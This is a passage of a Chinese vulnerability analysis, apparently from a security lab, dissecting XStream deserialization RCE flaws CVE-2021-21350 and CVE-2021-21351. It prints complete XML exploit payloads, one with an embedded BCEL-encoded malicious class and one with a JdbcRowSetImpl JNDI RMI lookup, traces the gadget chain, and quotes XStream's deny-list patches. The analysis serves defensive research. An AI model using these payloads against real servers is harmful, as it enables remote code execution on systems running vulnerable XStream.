    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>
                  <parent class='sun.misc.Launcher$ExtClassLoader'>
                  </parent>
                  <package2certs class='hashtable'/>
                  <classes defined-in='java.lang.ClassLoader'/>
                  <defaultDomain>
                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <packages/>
                  <nativeLibraries/>
                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>
                  <defaultAssertionStatus>false</defaultAssertionStatus>
                  <classes/>
                  <ignored__packages>
                    <string>java.</string>
                    <string>javax.</string>
                    <string>sun.</string>
                  </ignored__packages>
                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>
                    <__path>
                      <paths/>
                      <class__path>.</class__path>
                    </__path>
                    <__loadedClasses/>
                  </repository>
                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>0</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

该漏洞的整个利用链和 CVE-2021-21345 如出一辙，不同的地方在于，最后的加载恶意 Class 的 Classloader 不再使用 URLClassloader 去远程加载，而是采用了 com.sun.org.apache.bcel.internal.util.ClassLoader，这里相信对 FastJson 有了解的同学应该不陌生，这里使用了 BCEL 的方式来进行恶意代码执行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxPXCGwGdCSia7FgJGI1ttILhg1SBTG2wONzicXz6ib4HTo7yR5JnBCRXQg/640?wx_fmt=png)

但是整个利用链和 CVE-2021-21347 是一样的，所以这里也就不重复赘述了。  

**0x06  CVE-2021-21351**
========================

粘贴一下 POC  

```
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

这次用到的 gadget 入口点为 javax.naming.ldap.Rdn$RdnEntry，在使用该 POC 之前仍然有一个点是需要注意的， <__overrideDefaultParser> 这个标签在低版本的 jdk 中是没有的，需要进行更换。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosox3lDamJaby9UFyWyeeSMiayUXv0DpajGhle56RhQ71EHNPtWe3etiaOAQ/640?wx_fmt=png)

更换成以下标签。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxWtLmBhGTnAica7LYqG3PfUq0WicR4UD9MJX9icZdEIfDibUPYIlpLv3uLg/640?wx_fmt=png)

接下来就用 jdk1.8.20 为例，来进行分析。首先在 POC 中我们可以直观的看到，有两个 Rdn\$RdnEntry 的序列化数据，最外层的触发点是 Rdn\$RdnEntry.compareTo 方法，该方法是对比两个 Rdn\$RdnEntry 的 value 属性是否相同。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosox6BtuaIz7SZJ5DKwfYhh9wic2sYOibEVDmmk5ibb59JicXibpExzHvOcfdXQ/640?wx_fmt=png)

当前对象的 value 属性是一个 Xstring 对象，在 POC 中的这个位置。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxiclGPian2dxpc0c4MvdoSxDCOAL2O4RqvN9HGxXxgQHpP4vP3lziaia4ag/640?wx_fmt=png)

所以跟进 Xstring.equals 方法，该方法中需要注意的是调用了 obj2 也就是传入的 XRTreeFrag.toString 方法，跟进该方法

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxIwcLQwbcaoWibC4Uf6kOSaM6icTOgq9yaulkmmBSgiaXwksTy7ZVicHc1g/640?wx_fmt=png)

经过一次嵌套调用后，来到 XRTreeFrag.str 方法中 这里调用了之前就封装在 POC 中的 SAX2DTM 对象，如下图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxCI32rJXsHOmqpc9o32RM49UnJjsDE2NDUxic5JME2XWgMNEWvI61msQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxcA3GzsygeYPf2UG25ia2LhxCqBUyZfCTg0aiceKwzicMoeSXVNzfvhhiag/640?wx_fmt=png)

跟入 SAX2DTM.getStringValue 方法，经过两次嵌套调用后，来到了 SAX2DTM.nextNode 方法中，该方法中需要注意的是调用了 m_incrementalSAXSource 属性也就是 POC 中封装好的 IncrementalSAXSource_Xerces 对象的 deliverMoreNodes 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxcSyv8iauicos1oqiabAMmH72IibOFH4je13ZLrvJ0UH6tnwggyrCMJaBWA/640?wx_fmt=png)

继续向下执行，最终会执行到 IncrementalSAXSource_Xerces.parseSome 方法，该方法会通过反射调用 JdbcRowSetImpl.setAutoCommit 方法。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/H6W1QCHf9dFH7X7yR92ekXD9gNvUosoxyDVj0Wjc13wEYk7Miay5fAPGAxUAeZxicnD9RaJhXNVPwHObA7fEb7jg/640?wx_fmt=png)

接下来的流程就还是 JdbcRowSetImpl 的老一套了，就不再深入说明了。至此 CVE-2021-21351 分析完毕

**0x07  总结**
============

此次爆出的几个反序列化 RCE 漏洞，总结下漏洞的触发点分别为 “java.util.PriorityQueue.compare()“、“javax.naming.ldap.Rdn$RdnEntry.compareTo()”、而 Xstream 的防护方法也是很直白是通过黑名单的形式来进行防护。

下面是 1.4.15 版本的黑名单

```
protected void setupSecurity() {
    if (securityMapper == null) {
        return;
    }

    addPermission(AnyTypePermission.ANY);
    denyTypes(new String[]{
        "java.beans.EventHandler", //
        "java.lang.ProcessBuilder", //
        "javax.imageio.ImageIO$ContainsFilter", //
        "jdk.nashorn.internal.objects.NativeString" });
    denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, JAVAX_CRYPTO, JAXWS_FILE_STREAM});
    allowTypeHierarchy(Exception.class);
    securityInitialized = false;
}
```

然后是 1.4.16 版本的黑名单

```
private static final String ANNOTATION_MAPPER_TYPE = "com.thoughtworks.xstream.mapper.AnnotationMapper";
    private static final Pattern IGNORE_ALL = Pattern.compile(".*");
    private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
    private static final Pattern PRIVILEGED_GETTER = Pattern.compile(".*\\$PrivilegedGetter");
    private static final Pattern LAZY_ITERATORS = Pattern.compile(".*\\$LazyIterator");
    private static final Pattern JAXWS_ITERATORS = Pattern.compile(".*\\$ServiceNameIterator");
    private static final Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile("javafx\\.collections\\.ObservableList\\$.*");
    private static final Pattern JAVAX_CRYPTO = Pattern.compile("javax\\.crypto\\..*");
    private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");

......
  
protected void setupSecurity() {
    if (this.securityMapper != null) {
        this.addPermission(AnyTypePermission.ANY);
        this.denyTypes(new String[]{"java.beans.EventHandler", "java.lang.ProcessBuilder", "javax.imageio.ImageIO$ContainsFilter", "jdk.nashorn.internal.objects.NativeString", "com.sun.corba.se.impl.activation.ServerTableEntry", "com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator", "sun.awt.datatransfer.DataTransferer$IndexOrderComparator", "sun.swing.SwingLazyValue"});
        this.denyTypesByRegExp(new Pattern[]{LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL});
        this.denyTypeHierarchy(InputStream.class);
        this.denyTypeHierarchyDynamically("java.nio.channels.Channel");
        this.denyTypeHierarchyDynamically("javax.activation.DataSource");
        this.denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
        this.allowTypeHierarchy(Exception.class);
        this.securityInitialized = false;
    }
}
```

天融信阿尔法实验室成立于 2011 年，一直以来，阿尔法实验室秉承 “攻防一体” 的理念，汇聚众多专业技术研究人员，从事攻防技术研究，在安全领域前瞻性技术研究方向上不断前行。作为天融信的安全产品和服务支撑团队，阿尔法实验室精湛的专业技术水平、丰富的排异经验，为天融信产品的研发和升级、承担国家重大安全项目和客户服务提供强有力的技术支撑。

![](https://mmbiz.qpic.cn/mmbiz_png/H6W1QCHf9dGzl82mzUnria2aRHC2qXyjPVlLXVu0vuVTibibstKdqiaF8hP2rvmtmtDm94UPkmlyJM7EVibU1CUicianA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/H6W1QCHf9dGzl82mzUnria2aRHC2qXyjPcwJ5CfWHHR6hOtO8ROTibTMQYmBmxEjolYAUO4YhHyY5pZIX8gLefUw/640?wx_fmt=jpeg)

天融信

阿尔法实验室

长按二维码关注我们